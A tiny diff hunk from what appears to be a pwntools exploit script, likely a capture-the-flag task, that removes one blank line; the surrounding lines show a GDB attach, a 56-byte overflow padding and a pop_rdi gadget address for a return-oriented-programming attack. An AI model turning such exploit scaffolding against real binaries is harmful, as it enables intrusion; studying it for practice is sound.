@@ -16,7 +16,6 @@ else:
     if args['GDB']:
         gdb.attach(io)
     
-    
 
 offset = 56 * b'A'
 pop_rdi = 0x0000000000401393
